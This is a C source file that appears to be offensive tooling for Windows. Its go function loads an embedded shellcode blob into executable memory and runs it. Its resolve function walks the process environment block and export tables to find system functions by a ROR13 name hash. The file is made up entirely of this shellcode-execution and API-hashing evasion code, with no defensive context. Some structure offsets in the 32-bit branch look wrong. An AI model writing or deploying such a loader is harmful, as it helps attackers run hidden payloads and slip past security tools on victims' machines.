#include <windows.h>

WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
WINBASEAPI BOOL   WINAPI KERNEL32$VirtualProtect(LPVOID, SIZE_T, DWORD, PDWORD);

char _SHELLCODE_ [0] __attribute__ ( ( section ( "shellcode" ) ) );
#define GETRESOURCE(x) ( char * ) &x

void go ( )
{
    char * sc_src = GETRESOURCE ( _SHELLCODE_ );

    DWORD sc_len = *(DWORD *)sc_src;
    sc_src += 4;

    char * sc_dst = (char *) KERNEL32$VirtualAlloc (
        NULL, sc_len,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if ( !sc_dst ) return;

    for ( DWORD i = 0; i < sc_len; i++ )
        sc_dst[i] = sc_src[i];

    DWORD old = 0;
    KERNEL32$VirtualProtect ( sc_dst, sc_len, PAGE_EXECUTE_READ, &old );

    ( (void (*)(void)) sc_dst ) ();
}

/*
 * PEB/LDR offsets for x64 (raw, no struct dependency):
 *   PEB:          GS:[0x60]
 *   PEB->Ldr:     offset 0x18
 *   Ldr->InMemoryOrderModuleList: offset 0x20
 *   LDR_DATA_TABLE_ENTRY (from InMemoryOrderLinks at +0x10):
 *     DllBase:      +0x30  (= InMemoryOrderLinks + 0x20)
 *     FullDllName:  +0x48  (= InMemoryOrderLinks + 0x38)
 *       .Buffer:    +0x08 within UNICODE_STRING
 */
FARPROC resolve ( DWORD mod_hash, DWORD func_hash )
{
    char * peb;
#ifdef _WIN64
    peb = (char *) __readgsqword ( 0x60 );
#else
    peb = (char *) __readfsdword ( 0x30 );
#endif

    char * ldr = *(char **) ( peb + 0x18 );
    char * head = ldr + 0x20;
    char * curr = *(char **) head;  /* head->Flink */

    while ( curr != head )
    {
        /*
         * curr points to InMemoryOrderLinks (+0x10 in the entry).
         * DllBase    = entry + 0x30 = curr + 0x20
         * FullDllName.Buffer = entry + 0x48 + 0x08 = curr + 0x40
         */
        WCHAR * name = *(WCHAR **) ( curr + 0x40 );
        if ( !name ) { curr = *(char **) curr; continue; }

        WCHAR * base_name = name;
        WCHAR * p = name;
        while ( *p ) {
            if ( *p == '\\' || *p == '/' )
                base_name = p + 1;
            p++;
        }

        DWORD m_hash = 0;
        unsigned char * bp = (unsigned char *) base_name;
        while ( bp[0] || bp[1] )
        {
            unsigned char lo = bp[0];
            unsigned char hi = bp[1];
            if ( hi == 0 && lo >= 'a' && lo <= 'z' )
                lo -= 0x20;
            m_hash = ( m_hash >> 13 ) | ( m_hash << 19 );
            m_hash += lo;
            m_hash = ( m_hash >> 13 ) | ( m_hash << 19 );
            m_hash += hi;
            bp += 2;
        }

        if ( m_hash == mod_hash )
        {
            char * base = *(char **) ( curr + 0x20 );
            DWORD e_lfanew = *(DWORD *) ( base + 0x3C );
            char * nt = base + e_lfanew;

#ifdef _WIN64
            DWORD export_size = *(DWORD *) ( nt + 0x18 + 0x70 + 4 );
            DWORD export_rva  = *(DWORD *) ( nt + 0x18 + 0x70 );
#else
            DWORD export_size = *(DWORD *) ( nt + 0x18 + 0x60 + 4 );
            DWORD export_rva  = *(DWORD *) ( nt + 0x18 + 0x60 );
#endif
            if ( export_size == 0 )
                return NULL;

            char * exports = base + export_rva;

            DWORD num_names  = *(DWORD *) ( exports + 0x18 );
            DWORD * names    = (DWORD *) ( base + *(DWORD *) ( exports + 0x20 ) );
            WORD  * ordinals = (WORD *)  ( base + *(DWORD *) ( exports + 0x24 ) );
            DWORD * funcs    = (DWORD *) ( base + *(DWORD *) ( exports + 0x1C ) );

            for ( DWORD i = 0; i < num_names; i++ )
            {
                char * fn_name = base + names[i];
                DWORD f_hash = 0;
                char * fp = fn_name;
                while ( *fp )
                {
                    f_hash = ( f_hash >> 13 ) | ( f_hash << 19 );
                    f_hash += *fp++;
                }

                if ( f_hash == func_hash )
                    return (FARPROC) ( base + funcs[ ordinals[i] ] );
            }

            return NULL;
        }

        curr = *(char **) curr;  /* curr->Flink */
    }

    return NULL;
}
